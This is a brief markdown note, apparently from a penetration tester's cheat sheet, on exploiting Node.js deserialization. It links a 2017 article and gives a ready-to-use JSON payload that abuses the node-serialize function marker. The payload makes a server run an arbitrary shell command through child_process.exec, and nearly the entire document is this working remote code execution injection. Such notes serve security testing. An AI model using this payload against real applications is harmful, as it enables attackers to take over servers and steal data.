#deserialization #nodejs 

## Resource
https://opsecx.com/index.php/2017/02/08/exploiting-node-js-deserialization-bug-for-remote-code-execution/

## Command execution
```json
{"rce":"_$$ND_FUNC$$_function(){\n    require('child_process').exec('MY_COMMAND', function(error, stdout, stderr) { console.log(stdout) });\n  }()"}
```